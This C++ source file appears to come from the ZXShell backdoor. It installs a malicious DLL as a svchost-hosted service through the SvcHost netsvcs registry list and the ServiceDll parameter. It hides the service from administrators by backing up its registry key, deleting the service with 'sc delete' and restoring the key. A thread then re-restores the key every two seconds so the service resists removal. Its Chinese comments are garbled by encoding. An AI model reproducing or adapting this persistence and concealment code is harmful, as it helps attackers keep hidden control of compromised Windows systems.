/*
��װһ������svchost�ķ��񣬲����ط���
*/

#include <windows.h>
#include <stdio.h>
#include "..\zxsCommon\debugoutput.h"
#include "ddos.h"

const char ZXMUTEX  []= "@_ZXSHELL_@";

BOOL WINAPI Install();


LONG SaveRegistrySubKey(
    HKEY hKey,              // handle of key to save
    LPTSTR szSubKey,        // pointer to subkey name to save
    LPTSTR szSaveFileName   // pointer to save path/filename
    )
{
    HKEY hKeyToSave;    // Handle of subkey to save
    LONG rc;            // result code from RegXxx
    DWORD dwDisposition;

	DebugPrivilege(SE_BACKUP_NAME,TRUE);

    if((rc=ZXSAPI::RegCreateKeyEx(hKey,
                          szSubKey, // Name of subkey to open
                          0,
                          NULL,
                          REG_OPTION_BACKUP_RESTORE, // in winnt.h
                          KEY_QUERY_VALUE, // minimal access
                          NULL,
                          &hKeyToSave,
                          &dwDisposition)
                          ) == ERROR_SUCCESS)
    {
        // Save registry subkey.  If the registry is remote, files will
        // be saved on the remote machine
        rc=ZXSAPI::RegSaveKey(hKeyToSave, szSaveFileName, NULL);
        // close registry key we just tried to save
        RegCloseKey(hKeyToSave);
    }

	DebugPrivilege(SE_BACKUP_NAME,FALSE);
    // return the last registry result code
    return rc;
}

LONG RestoreRegistrySubKey(
    HKEY hKey,              // handle of key to save
    LPTSTR szSubKey,        // pointer to subkey name to save
    LPTSTR szSaveFileName   // pointer to save path/filename
    )
{
    HKEY hKeyToRestore;    // Handle of subkey to save
    LONG rc;            // result code from RegXxx
    DWORD dwDisposition;

	DebugPrivilege(SE_RESTORE_NAME,TRUE);

	//2000�ƺ�ֱ��REG_OPTION_BACKUP_RESTORE��ʱ�����û�Ӽ����ᴴ��
    if((rc=ZXSAPI::RegCreateKeyEx(hKey,
                          szSubKey, // Name of subkey to open
                          0,
                          NULL,
                          0,
                          KEY_CREATE_SUB_KEY, 
                          NULL,
                          &hKeyToRestore,
                          &dwDisposition)
                          ) == ERROR_SUCCESS)
    {
		RegCloseKey(hKeyToRestore);
	}

    if((rc=ZXSAPI::RegCreateKeyEx(hKey,
                          szSubKey, // Name of subkey to open
                          0,
                          NULL,
                          REG_OPTION_BACKUP_RESTORE, // in winnt.h
                          0, // ignored
                          NULL,
                          &hKeyToRestore,
                          &dwDisposition)
                          ) == ERROR_SUCCESS)
    {

        rc=ZXSAPI::RegRestoreKey(hKeyToRestore, szSaveFileName, REG_FORCE_RESTORE);

        RegCloseKey(hKeyToRestore);
    }

	DebugPrivilege(SE_RESTORE_NAME,FALSE);

    return rc;
}
//ͨ��SCM�������Ƿ�װ
BOOL SCM_TestSvcName(IN SC_HANDLE schSCManager, char *szServiceName)
{
	SC_HANDLE         schService;
    SERVICE_STATUS    ServiceStatus;

	schService = OpenService(schSCManager,szServiceName,SERVICE_ALL_ACCESS);
	if(schService == NULL)
	{
		if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			return TRUE;
	}else
	{
		CloseServiceHandle(schService);
	}
	return FALSE;
}

//�ж�ע�����ֵ�Ƿ����
//���ڷ���true������false
BOOL REG_TestKey(char *szKey)
{
	LONG rc;
	HKEY hKey;

	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                          szKey, // Name of subkey to open
                          0,
                          KEY_READ, // minimal access
                          &hKey
                          );
	if(rc == ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return TRUE;
	}
	return FALSE;
}

//ͨ��ע����������ֵ�Ƿ񲻴��ڣ� ���ж��Ƿ�Ϊ�ɰ�װ�ķ�����
BOOL REG_TestSvcName(char *szServiceName)
{
	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s", szServiceName);

	return !REG_TestKey(svcPath);
}

//û�õĺ��������ķ���Ϊ[�ɻ���]
BOOL TestToChangeServiceType(IN SC_HANDLE schSCManager, char *szServiceName)
{
	SC_HANDLE         schService;
    SERVICE_STATUS    ServiceStatus;
	LPQUERY_SERVICE_CONFIG lpServiceConfig;
	DWORD cbBufSize;
	DWORD cbBytesNeeded;
	BOOL bSuccess = FALSE;

	schService = OpenService(schSCManager,szServiceName,SERVICE_ALL_ACCESS);
	if(schService == NULL)
		return FALSE;

	if(!QueryServiceConfig(schService, NULL, 0, &cbBytesNeeded))
	{
		if(GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			goto error;
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, cbBytesNeeded); 
		if(lpServiceConfig == NULL)
			goto error;
		cbBufSize = cbBytesNeeded;
		if(QueryServiceConfig(schService, lpServiceConfig, cbBufSize, &cbBytesNeeded))
		{
			if(!(lpServiceConfig->dwServiceType & SERVICE_INTERACTIVE_PROCESS))
			{
				lpServiceConfig->dwServiceType |= SERVICE_INTERACTIVE_PROCESS;

				bSuccess = ChangeServiceConfig(schService, 
					lpServiceConfig->dwServiceType,
					lpServiceConfig->dwStartType,
					lpServiceConfig->dwErrorControl,
					lpServiceConfig->lpBinaryPathName,
					lpServiceConfig->lpLoadOrderGroup,
					&lpServiceConfig->dwTagId,
					lpServiceConfig->lpDependencies,
					lpServiceConfig->lpServiceStartName,
					NULL,
					lpServiceConfig->lpDisplayName);
			}
		}
		LocalFree(lpServiceConfig); 
	}
	
error:
	CloseServiceHandle(schService);
	return bSuccess;
}
//û�õĺ������������з���Ϊ[�ɻ���]
int ChangeAllServiceType()
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_MULTI_SZ;
	PBYTE Buffer;
	DWORD cbData = 0, nLen;
	int nCount = 0;
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{
		rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, 0, &cbData);
		if(rc == ERROR_SUCCESS)
		{
			Buffer = new BYTE [cbData];
			if(Buffer == NULL)
				return 0;
			SC_HANDLE   SchSCManager;

			SchSCManager = ZXSAPI::OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
			if(SchSCManager == NULL)
			{
				return 0;
			}
			__try
			{
				memset(Buffer, 0, cbData);
				rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, Buffer, &cbData);
				if(rc == ERROR_SUCCESS)
				{
					char SvcName[MAX_PATH] = "\0";
					const char *pNextSvc = (char*)Buffer;
					while(pNextSvc = TakeOutStringByChar(pNextSvc, SvcName, MAX_PATH, '\0'))
					{
						if(TestToChangeServiceType(SchSCManager, SvcName))
							nCount++;
					}
				}

			}__finally
			{
				CloseServiceHandle(SchSCManager);
				delete[] Buffer;
				return nCount;
			}
		}
	}
	return nCount;
}
//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost
//��SvcHost�����б��л��δ��װ�ķ���
BOOL GetNotInstalledSvcName(char *SvcName)
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_MULTI_SZ;
	PBYTE Buffer;
	DWORD cbData = 0, nLen;
	BOOL bError = FALSE;
	BOOL nRet = FALSE;
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{
		rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, 0, &cbData);
		if(rc == ERROR_SUCCESS)
		{
			cbData += lstrlen(SvcName) + 1;
			nLen = cbData;
			Buffer = new BYTE [cbData];
			if(Buffer == NULL)
				return FALSE;
/*			SC_HANDLE   SchSCManager;

			SchSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
			if(SchSCManager == NULL)
			{
				return FALSE;
			}*/
			__try
			{
				memset(Buffer, 0, cbData);
				rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, Buffer, &cbData);
				if(rc == ERROR_SUCCESS)
				{
					const char *pNextSvc = (char*)Buffer;
					while(pNextSvc = TakeOutStringByChar(pNextSvc, SvcName, MAX_PATH, '\0'))
					{
						if(REG_TestSvcName(SvcName))
						{
							bError = TRUE;
							break;
						}
					}
				}

			}__finally
			{
				//CloseServiceHandle(SchSCManager);
				delete[] Buffer;
				return bError;
			}
		}
	}
	return FALSE;
}
//����һ������SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost
LONG AddSvcToNetsvcs(char *SvcName)
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_MULTI_SZ;
	PBYTE Buffer;
	DWORD cbData = 0, nLen;
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{
		rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, 0, &cbData);
		if(rc == ERROR_SUCCESS)
		{
			cbData += lstrlen(SvcName) + 1;
			nLen = cbData;
			Buffer = new BYTE [cbData];
			if(Buffer == NULL)
				return -1;
			__try
			{
				memset(Buffer, 0, cbData);
				rc = ZXSAPI::RegQueryValueEx(hKey, "netsvcs", 0, &Type, Buffer, &cbData);
				if(rc == ERROR_SUCCESS)
				{
					strcpy((char *)Buffer+cbData-1, SvcName);
					rc = ZXSAPI::RegSetValueEx(hKey, "netsvcs", 0, Type, Buffer, nLen);
					if(rc == ERROR_SUCCESS)
					{
						RegCloseKey(hKey);
						return 0;
					}
				}
			}__finally
			{
				delete[] Buffer;
			}
		}
	}
	return rc;
}

LONG AddNewNetsvcGroup(char *Group, char *SvcName)
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_MULTI_SZ;
	DWORD cbData = lstrlen(SvcName);
	PBYTE Buffer = (PBYTE)SvcName;
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{

		rc = ZXSAPI::RegSetValueEx(hKey, Group, 0, Type, Buffer, cbData);
		if(rc == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return 0;
		}

	}
	return rc;
}

LONG DelNetsvcGroup(char *Group)
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_MULTI_SZ;

	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{

		rc = RegDeleteValue(hKey, Group);
		if(rc == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return 0;
		}

	}
	return rc;
}

BOOL SetNetsvcParameters(char *SvcName, char *szData)
{
	LONG rc;
	HKEY hKey;
	DWORD dwDisposition;
	DWORD Type = REG_EXPAND_SZ;
	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", SvcName);
	rc = ZXSAPI::RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                          svcPath, // Name of subkey to open
                          0,
                          NULL,
                          0,
                          KEY_WRITE|KEY_SET_VALUE, // minimal access
                          NULL,
                          &hKey,
                          &dwDisposition
                          );
	if(rc == ERROR_SUCCESS)
	{

		rc = ZXSAPI::RegSetValueEx(hKey, "ServiceDll", 0, Type, (PBYTE)szData, lstrlen(szData));
		if(rc != ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return FALSE;
		}
		RegFlushKey(hKey);
		Type = REG_DWORD;
		rc = false;
		rc = ZXSAPI::RegSetValueEx(hKey, "ServiceDllUnloadOnStop", 0, Type, (PBYTE)&rc, sizeof(DWORD));

		RegFlushKey(hKey);
		RegCloseKey(hKey);
		return TRUE;
	}
	return FALSE;
}

BOOL IsOwnProcessService(char *SvcName)
{
	LONG rc;
	HKEY hKey;
	DWORD Type = REG_DWORD;
	char svcPath[MAX_PATH];
	DWORD dwType;
	DWORD cbData = sizeof(DWORD);

	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s", SvcName);

	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		svcPath,
		0,
		KEY_READ|KEY_WRITE,
		&hKey);
	if(rc == ERROR_SUCCESS)
	{
		rc = ZXSAPI::RegQueryValueEx(hKey, "Type", 0, &Type, (LPBYTE)&dwType, &cbData);
		if(rc == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return dwType & SERVICE_WIN32_OWN_PROCESS;
		}
		RegCloseKey(hKey);
	}
	return 0;
}

DWORD WINAPI SaveMyService(LPVOID lParam)
{
	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s", ServiceName);

	while(Working)
	{
		RestoreRegistrySubKey(HKEY_LOCAL_MACHINE, 
			svcPath, 
			regSvcInfoFile);

		Sleep(2008);
	}

	return 0;
}

int createthread_SaveMyService()
{
	DWORD dwID;
	HANDLE hThread;

	hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)SaveMyService, (LPVOID)regSvcInfoFile, 0, &dwID);//��ֹ�����ע�����Ϣ��ɾ��

	CloseHandle(hThread);

	return 1;
}

//ͨ�����������ע�����Ϣ---ɾ������---�ָ�ע�����Ϣ���Ӷ��ﵽ���ط���
BOOL HideSvc(char *SvcName)
{
	char szCmd[MAX_PATH];
	MainPara args;
	args.Socket = 0;
	args.lpCmd = szCmd;

	char szTempName[MAX_PATH];
	char svcPath[MAX_PATH];
	int ret;

	if(IsOwnProcessService(SvcName))
	{
		DebufLog.Print("%s IsOwnProcessService", SvcName);
		return 0;
	}

	//process share mode

	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s", SvcName);

	//srand( (unsigned)time( NULL ) );

	ret = GetTempPath(MAX_PATH,   // length of the buffer
		szTempName);      // buffer for path 

	//sprintf(szTempName+ret, "~tmp%.8x.old", ((rand()%(0xffff))<<16)|((rand()%(0xffff))) );

	sprintf(regSvcInfoFile, "%s\\~tmp%.8x.old", szTempName, MakeRand32(checksum((USHORT*)SvcName, strlen(SvcName))) );

	//strcpy(regSvcInfoFile, szTempName);//���Ʒ����REG��Ϣ�ļ�·��

	if(SaveRegistrySubKey(HKEY_LOCAL_MACHINE, svcPath, regSvcInfoFile) == ERROR_SUCCESS)
	{
		DebufLog.Print("%s: SaveRegistrySubKey: %s", SvcName, regSvcInfoFile);

		sprintf(szCmd, "sc delete %s", SvcName);
		ServiceController(&args);

		int tRestore = 0;
		ret = 0;
		while(tRestore<10)
		{

			DebufLog.Print("%s: RestoreRegistrySubKey.tRestore=%d", SvcName, tRestore);

			if((RestoreRegistrySubKey(HKEY_LOCAL_MACHINE, 
					svcPath, 
					regSvcInfoFile) == ERROR_SUCCESS)
				&& REG_TestKey(svcPath)
					)
			{

				DebufLog.Print("%s: RestoreRegistrySubKey succeed. tRestore=%d", SvcName, tRestore);

				ret = 1;
				break;
			}
			Sleep(1000);

			tRestore++;
		}
		if(ret == 0)
		{
			DebufLog.Print("%s: RestoreRegistrySubKey failed. tRestore=%d", SvcName, tRestore);
	
			Install();
		}

		ZXSAPI::MoveFileEx(regSvcInfoFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	}else
	{
		DebufLog.Print("%s: SaveRegistrySubKey: %s Error!", SvcName, regSvcInfoFile);

		ret = 0;
	}

	return ret;
}

//��װ����
BOOL WINAPI Install()
{
	char szCmd[MAX_PATH];
	MainPara args;
	args.Socket = 0;
	args.lpCmd = szCmd;

	//char szPath[MAX_PATH] = "\0";
	BOOL bError = TRUE;
	BOOL nRet = FALSE;
	int tryTimes = 0;

	srand( (unsigned)GetTickCount() );

	printf("Searching a usable service name......\r\n");
	if(!GetNotInstalledSvcName(ServiceName))
	{
_TRYONCEAGAIN:

		if(tryTimes++ > 10)
			return FALSE;

		bError = FALSE;

		sprintf(szCmd, "netsvc_%.8x", 
			((rand()%(0xffff))<<16)|((rand()%(0xffff))) 
			);

		AddSvcToNetsvcs(szCmd);
		strcpy(ServiceName, szCmd);
	}

	printf("%d. Service name prepared to install is \"%s\"\r\n", tryTimes, ServiceName);

	//ZXSAPI::GetModuleFileName(HMODULE(g_hDll), szPath, MAX_PATH);

	sprintf(szCmd, "sc create %s %s %s %d %d",
	ServiceName,
	ServiceName, 
	"\"%SystemRoot%\\System32\\svchost.exe -k netsvcs\"",
	0, 0);
	
	nRet = ServiceController(&args);
	if(!nRet)
	{
		goto _FAILED_DELSVC;
	}

	nRet = SetNetsvcParameters(ServiceName, g_DllPath);
	if(!nRet)
	{
		goto _FAILED_DELSVC;
	}

	if(bError)//�ҵõ�SvcHost->netsvcs��δ��װ�ķ���-type 1Ϊshareģʽ
	{
		sprintf(szCmd, "sc config %s -type 1 -type 2", ServiceName);
		ServiceController(&args);

		sprintf(szCmd, "sc start %s", ServiceName);
		nRet = ServiceController(&args);
	}else//�Ҳ���,Ҫ�����÷���Ϊownģʽ-type 0������������,Ȼ�������û�ȥ
	{
		sprintf(szCmd, "sc config %s -type 0 -type 2", ServiceName);
		ServiceController(&args);

		sprintf(szCmd, "sc start %s", ServiceName);
		nRet = ServiceController(&args);

		Sleep(2000);

		sprintf(szCmd, "sc config %s -type 1 -type 2", ServiceName);
		ServiceController(&args);
	}

	if(nRet == FALSE)//ʧ�ܣ����ܰ�װʧ�ܻ���������ʧ�ܣ�ɾ��������
	{
_FAILED_DELSVC:
		sprintf(szCmd, "sc delete %s", ServiceName);
		ServiceController(&args);
		goto _TRYONCEAGAIN;
	}

	return nRet;
}
//жװ����
BOOL WINAPI UnInstall()
{
	LONG rc;

	char svcPath[MAX_PATH];

	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\%s", ServiceName);

	rc = SHDeleteKey(HKEY_LOCAL_MACHINE, svcPath);
	if(rc != ERROR_SUCCESS)
	{
		return FALSE;
	}

	Working = FALSE;//defined in shellmain.h

	SHDeleteKey(HKEY_LOCAL_MACHINE, svcPath);

	//ZXSAPI::GetModuleFileName(HMODULE(g_hDll), Temp, sizeof(Temp));
	ZXSAPI::MoveFileEx(g_DllPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	return TRUE;
}
